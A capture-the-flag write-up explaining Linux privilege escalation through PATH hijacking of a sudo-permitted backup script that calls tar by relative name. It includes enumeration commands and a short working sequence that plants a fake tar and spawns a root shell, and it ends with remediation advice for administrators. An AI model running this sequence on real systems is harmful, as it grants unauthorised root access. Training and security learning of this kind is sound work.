# CTF Writeup: Linux Privilege Escalation

Platform: TryHackMe-style room. Starting point: low-privilege shell already obtained (given as the room's starting condition, not something I had to exploit to get).

## Starting point
Landed a shell as user `web-svc` after the room's initial foothold step. Goal: escalate to root.

## Enumeration
Ran the basics first rather than jumping to any specific technique:

```
sudo -l
find / -perm -4000 -type f 2>/dev/null
cat /etc/crontab
```

`sudo -l` showed `web-svc` could run one specific script as root with no password:
```
(root) NOPASSWD: /opt/scripts/backup.sh
```

## Investigating the script
```bash
cat /opt/scripts/backup.sh
```
The script called `tar` on a directory, but used a relative path without specifying `tar`'s full location — meaning it relied on `$PATH` to find the `tar` binary rather than calling `/bin/tar` explicitly.

## Exploiting it
Since I could run this script as root, and it trusted `$PATH` for finding `tar`, I could put a malicious file named `tar` earlier in the `$PATH` and have the script execute it as root instead of the real `tar` binary.

```bash
echo '#!/bin/bash' > /tmp/tar
echo '/bin/bash -p' >> /tmp/tar
chmod +x /tmp/tar
export PATH=/tmp:$PATH
sudo /opt/scripts/backup.sh
```

This spawned a root shell, since the fake `tar` script ran with the privileges of the sudo call.

## Root cause
Classic PATH hijacking via an insecure script — a sudo-permitted script that doesn't hardcode binary paths inherits whatever `$PATH` the calling user controls. This is a genuinely common misconfiguration, not a contrived CTF-only issue; I've seen the same pattern flagged in real audit checklists.

## What I'd tell an admin
Two fixes, and I'd push for both rather than picking one: hardcode full binary paths in any script that runs with elevated privileges (`/bin/tar` instead of `tar`), and set `secure_path` in the sudoers config so sudo ignores the calling user's `$PATH` entirely regardless of what any individual script does.

## Lesson for myself
This wasn't a hard exploit technically, but it only jumped out at me because I read the actual script content instead of just noting "sudo access to backup.sh, probably fine." Enumeration output is only useful if you actually read what it says, not just that it exists.
